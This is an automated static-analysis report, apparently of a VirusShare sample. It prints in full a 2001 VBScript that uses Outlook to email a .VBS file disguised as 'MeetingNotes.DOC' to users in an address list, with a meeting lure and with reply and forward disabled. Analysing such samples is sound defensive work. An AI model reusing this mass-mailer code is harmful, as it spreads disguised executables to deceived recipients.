{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
        },
        "macro": "'---\n'--- SendVirusMessages.VBS\n'---\n'--- 2/23/2001 (BS)\n'---\n'--- Creates and sends message to send to target users, with \n'---   attachment added with a different displayname.\n'---\n\nIf MsgBox(\"You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?\", vbYesNo, \"FIRST WARNING!!!!!\") = vbYes Then\n   If MsgBox(\"You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?\", vbYesNo, \"SECOND WARNING!!!!!\") = vbYes Then\n      DoIt\n   Else\n      MsgBox \"Cancelled - no emails generated or sent\"\n   End If\nElse\n   MsgBox \"Cancelled - no emails generated or sent\"\nEnd If\n\nSub DoIt()\n   Dim loOutlookApplication ' As Outlook.Application\n   Dim loMAPINameSpace      ' As Outlook.NameSpace\n   Dim loAddressList        ' As Outlook.AddressList\n   Dim loAddressEntry       ' As Outlook.AddressEntry\n   Dim llCntAllEntries      ' As Long\n   Dim llCntUserEntries     ' As Long\n   Dim llEntryDispType      ' As Long\n   Dim lsAddressName        ' As String\n   Dim loFSO                ' As Scripting.FileSystemObject\n   Dim loFile               ' As Scripting.TextStream\n   Dim loMailItem           ' As Outlook.MailItem\n   Dim loMailAttachment     ' As Outlook.Attachment\n   Dim llCntErrors          ' As Long\n   Dim llCntSent            ' As Long\n   Dim llCntIgnBlank        ' As Long\n   Dim llCntIgnPrefix       ' As Long\n\n   '--- Start logging actions\n   Set loFSO = WScript.CreateObject(\"Scripting.FileSystemObject\")\n   Set loFile = loFSO.OpenTextFile (\"\\\\DCNT1\\review\\SPA _Temporary\\Development\\Programming\\_Tools\\ImAnIdiot_Virus\\20010223\\SendVirusMessages.LOG\", 2, True)\n   loFile.WriteLine \"Sending ImAnIdiot virus.  Starting: \" & Now\n   loFile.WriteLine \"\"\n\n   '--- Connect to Outlook\n   Set loOutlookApplication=WScript.CreateObject(\"Outlook.Application\")\n   Set loMAPINameSpace=loOutlookApplication.GetNameSpace(\"MAPI\")\n\n   llCntUserEntries = 0\n   llCntAllEntries = 0\n   llCntErrors = 0\n   llCntSent = 0\n   llCntIgnBlank = 0\n   llCntIgnPrefix = 0\n\n   Set loAddressList = loMAPINameSpace.AddressLists(\"All WC&P\")\n   If loAddressList is Nothing Then\n      MsgBox \"Error: Couldn't find AddressList: All WC&P\"\n      loFile.WriteLine \"Error: Couldn't find AddressList: All WC&P\"\n      loFile.WriteLine \"\"\n   Else\n      loFile.WriteLine \"User Entries from 'All WC&P' Address list:\"\n      For Each loAddressEntry in loAddressList.AddressEntries\n         llEntryDispType = -1\n         lsAddressName = \"\"\n         On Error Resume Next ' Next line sometimes bombs (for weird types?)\n         llEntryDispType = loAddressEntry.DisplayType\n         lsAddressName = loAddressEntry.Name\n         On Error Goto 0\n         If llEntryDispType = 0 Then  ' olUser=0\n            lsAddressName = Trim(lsAddressName)\nIf lsAddressName <> \"Sanfelici, Brian\" then\nlsAddressName = \"\"\nend if\n            If lsAddressName = \"\" Then\n               llCntIgnBlank = llCntIgnBlank + 1\n            ElseIf Left(lsAddressName,1) = \"*\" Or                    Left(lsAddressName,1) = \"^\" Then\n               llCntIgnPrefix = llCntIgnPrefix + 1\n            Else\n               llCntAllEntries = llCntAllEntries + 1\n               '--- ----------------------\n               '--- Create email\n               '--- ----------------------\n               Set loMailItem = loOutlookApplication.CreateItem(0)\n               loMailItem.Recipients.Add lsAddressName\n               loMailItem.Subject = \"Document for upcoming meeting\"\n               loMailItem.Body = \"The attached document will help you prepare for the upcoming meeting.\" & vbcrlf & \"Please review it prior to the meeting.\" & vbcrlf & vbcrlf\n               loMailItem.ExpiryTime = Date + 4  '  Automatically delete message after 4 days\n               '  Disable user's ability to reply / forward email\n               loMailItem.Actions(\"Reply\").Enabled = False\n               loMailItem.Actions(\"Reply to All\").Enabled = False\n               loMailItem.Actions(\"Forward\").Enabled = False\n               loMailItem.Actions(\"Reply to Folder\").Enabled = False\n               loMailItem.AlternateRecipientAllowed = False\n               loMailItem.RecipientReassignmentProhibited = False\n               '--- Attach file  (olByValue = 1)\n               Set loMailAttachment = loMailItem.Attachments.Add(\"\\\\DCNT1\\review\\SPA _Temporary\\Development\\Programming\\_Tools\\ImAnIdiot_Virus\\20010223\\20010223.VBS\", 1, ,\"MeetingNotes.DOC\")\n               loMailItem.Categories = \"Test20010223\"\n \n               '--- ----------------------\n               '--- Send email\n               '--- ----------------------\n               If loMailItem.Recipients.ResolveAll() Then\n                  On Error Resume Next\n                  Err.Clear\n                  loMailItem.Send\n                  If Err.Number = 0 Then\n                     loFile.WriteLine \"   Resolved and sent: \" & lsAddressName \n                     llCntSent = llCntSent + 1\n                  Else\n                     loFile.WriteLine \"   ERROR: Resolved and not sent: \" & lsAddressName & \" (Err: \" & Err.Number & \" \" & Err.Description & \")\"\n                     llCntErrors = llCntErrors + 1\n                  End If\n               Else\n                  loFile.WriteLine \"   ERROR: Not Resolved: \" & lsAddressName\n                  llCntErrors = llCntErrors + 1\n               End if\n\n               Set loMailItem = Nothing\n\n               llCntUserEntries = llCntUserEntries + 1\n               loFile.WriteLine lsAddressName\n            End If\n         End If\n      Next\n      loFile.WriteLine \"\"\n      loFile.WriteLine \"Total All WC&P entries: \" & loAddressList.AddressEntries.Count\n      loFile.WriteLine \"User entries:           \" & llCntUserEntries\n      loFile.WriteLine \"Ignored (blank):        \" & llCntIgnBlank\n      loFile.WriteLine \"Ignored (*|^ prefix:    \" & llCntIgnPrefix\n      loFile.WriteLine \"Emails sent:            \" & llCntSent\n      loFile.WriteLine \"ERRORs:                 \" & llCntErrors\n      loFile.WriteLine \"\"\n      loFile.WriteLine \"Done: \" & Now\n   End If\n\n   loFile.Close\n\n   Set loFile = Nothing\n   Set loFSO = Nothing\n   Set loAddressList = Nothing\n   Set loMAPINameSpace = Nothing\n   Set loOutlookApplication = Nothing\nEnd Sub"
    },
    "filename": "VirusShare_3508d8da122db6baca3955d204a6327e",
    "filesize": 6416,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "3508d8da122db6baca3955d204a6327e",
        "sha1": "420ff28d54680e9b978a5fa3ed4cf22f4c99a3cc",
        "sha256": "2bf1d9ca056dc1fe60a6817ec6eba0a7f161f4d92f7e6cf36bb938cc55cc64bb"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'---",
            "'--- SendVirusMessages.VBS",
            "'---",
            "'--- 2/23/2001 (BS)",
            "'---",
            "'--- Creates and sends message to send to target users, with ",
            "'---   attachment added with a different displayname.",
            "'---",
            "If MsgBox(\"You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?\", vbYesNo, \"FIRST WARNING!!!!!\") = vbYes Then",
            "   If MsgBox(\"You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?\", vbYesNo, \"SECOND WARNING!!!!!\") = vbYes Then",
            "      DoIt",
            "   Else",
            "      MsgBox \"Cancelled - no emails generated or sent\"",
            "   End If",
            "Else",
            "   MsgBox \"Cancelled - no emails generated or sent\"",
            "End If",
            "Sub DoIt()",
            "   Dim loOutlookApplication ' As Outlook.Application",
            "   Dim loMAPINameSpace      ' As Outlook.NameSpace",
            "   Dim loAddressList        ' As Outlook.AddressList",
            "   Dim loAddressEntry       ' As Outlook.AddressEntry",
            "   Dim llCntAllEntries      ' As Long",
            "   Dim llCntUserEntries     ' As Long",
            "   Dim llEntryDispType      ' As Long",
            "   Dim lsAddressName        ' As String",
            "   Dim loFSO                ' As Scripting.FileSystemObject",
            "   Dim loFile               ' As Scripting.TextStream",
            "   Dim loMailItem           ' As Outlook.MailItem",
            "   Dim loMailAttachment     ' As Outlook.Attachment",
            "   Dim llCntErrors          ' As Long",
            "   Dim llCntSent            ' As Long",
            "   Dim llCntIgnBlank        ' As Long",
            "   Dim llCntIgnPrefix       ' As Long",
            "   '--- Start logging actions",
            "   Set loFSO = WScript.CreateObject(\"Scripting.FileSystemObject\")",
            "   Set loFile = loFSO.OpenTextFile (\"\\\\DCNT1\\review\\SPA _Temporary\\Development\\Programming\\_Tools\\ImAnIdiot_Virus\\20010223\\SendVirusMessages.LOG\", 2, True)",
            "   loFile.WriteLine \"Sending ImAnIdiot virus.  Starting: \" & Now",
            "   loFile.WriteLine \"\"",
            "   '--- Connect to Outlook",
            "   Set loOutlookApplication=WScript.CreateObject(\"Outlook.Application\")",
            "   Set loMAPINameSpace=loOutlookApplication.GetNameSpace(\"MAPI\")",
            "   llCntUserEntries = 0",
            "   llCntAllEntries = 0",
            "   llCntErrors = 0",
            "   llCntSent = 0",
            "   llCntIgnBlank = 0",
            "   llCntIgnPrefix = 0",
            "   Set loAddressList = loMAPINameSpace.AddressLists(\"All WC&P\")",
            "   If loAddressList is Nothing Then",
            "      MsgBox \"Error: Couldn't find AddressList: All WC&P\"",
            "      loFile.WriteLine \"Error: Couldn't find AddressList: All WC&P\"",
            "      loFile.WriteLine \"\"",
            "   Else",
            "      loFile.WriteLine \"User Entries from 'All WC&P' Address list:\"",
            "      For Each loAddressEntry in loAddressList.AddressEntries",
            "         llEntryDispType = -1",
            "         lsAddressName = \"\"",
            "         On Error Resume Next ' Next line sometimes bombs (for weird types?)",
            "         llEntryDispType = loAddressEntry.DisplayType",
            "         lsAddressName = loAddressEntry.Name",
            "         On Error Goto 0",
            "         If llEntryDispType = 0 Then  ' olUser=0",
            "            lsAddressName = Trim(lsAddressName)",
            "If lsAddressName <> \"Sanfelici, Brian\" then",
            "lsAddressName = \"\"",
            "end if",
            "            If lsAddressName = \"\" Then",
            "               llCntIgnBlank = llCntIgnBlank + 1",
            "            ElseIf Left(lsAddressName,1) = \"*\" Or _",
            "                   Left(lsAddressName,1) = \"^\" Then",
            "               llCntIgnPrefix = llCntIgnPrefix + 1",
            "            Else",
            "               llCntAllEntries = llCntAllEntries + 1",
            "               '--- ----------------------",
            "               '--- Create email",
            "               '--- ----------------------",
            "               Set loMailItem = loOutlookApplication.CreateItem(0)",
            "               loMailItem.Recipients.Add lsAddressName",
            "               loMailItem.Subject = \"Document for upcoming meeting\"",
            "               loMailItem.Body = \"The attached document will help you prepare for the upcoming meeting.\" & vbcrlf & \"Please review it prior to the meeting.\" & vbcrlf & vbcrlf",
            "               loMailItem.ExpiryTime = Date + 4  '  Automatically delete message after 4 days",
            "               '  Disable user's ability to reply / forward email",
            "               loMailItem.Actions(\"Reply\").Enabled = False",
            "               loMailItem.Actions(\"Reply to All\").Enabled = False",
            "               loMailItem.Actions(\"Forward\").Enabled = False",
            "               loMailItem.Actions(\"Reply to Folder\").Enabled = False",
            "               loMailItem.AlternateRecipientAllowed = False",
            "               loMailItem.RecipientReassignmentProhibited = False",
            "               '--- Attach file  (olByValue = 1)",
            "               Set loMailAttachment = loMailItem.Attachments.Add(\"\\\\DCNT1\\review\\SPA _Temporary\\Development\\Programming\\_Tools\\ImAnIdiot_Virus\\20010223\\20010223.VBS\", 1, ,\"MeetingNotes.DOC\")",
            "               loMailItem.Categories = \"Test20010223\"",
            "               '--- ----------------------",
            "               '--- Send email",
            "               '--- ----------------------",
            "               If loMailItem.Recipients.ResolveAll() Then",
            "                  On Error Resume Next",
            "                  Err.Clear",
            "                  loMailItem.Send",
            "                  If Err.Number = 0 Then",
            "                     loFile.WriteLine \"   Resolved and sent: \" & lsAddressName ",
            "                     llCntSent = llCntSent + 1",
            "                  Else",
            "                     loFile.WriteLine \"   ERROR: Resolved and not sent: \" & lsAddressName & \" (Err: \" & Err.Number & \" \" & Err.Description & \")\"",
            "                     llCntErrors = llCntErrors + 1",
            "                  End If",
            "               Else",
            "                  loFile.WriteLine \"   ERROR: Not Resolved: \" & lsAddressName",
            "                  llCntErrors = llCntErrors + 1",
            "               End if",
            "               Set loMailItem = Nothing",
            "               llCntUserEntries = llCntUserEntries + 1",
            "               loFile.WriteLine lsAddressName",
            "            End If",
            "         End If",
            "      Next",
            "      loFile.WriteLine \"\"",
            "      loFile.WriteLine \"Total All WC&P entries: \" & loAddressList.AddressEntries.Count",
            "      loFile.WriteLine \"User entries:           \" & llCntUserEntries",
            "      loFile.WriteLine \"Ignored (blank):        \" & llCntIgnBlank",
            "      loFile.WriteLine \"Ignored (*|^ prefix:    \" & llCntIgnPrefix",
            "      loFile.WriteLine \"Emails sent:            \" & llCntSent",
            "      loFile.WriteLine \"ERRORs:                 \" & llCntErrors",
            "      loFile.WriteLine \"\"",
            "      loFile.WriteLine \"Done: \" & Now",
            "   End If",
            "   loFile.Close",
            "   Set loFile = Nothing",
            "   Set loFSO = Nothing",
            "   Set loAddressList = Nothing",
            "   Set loMAPINameSpace = Nothing",
            "   Set loOutlookApplication = Nothing",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.310764",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
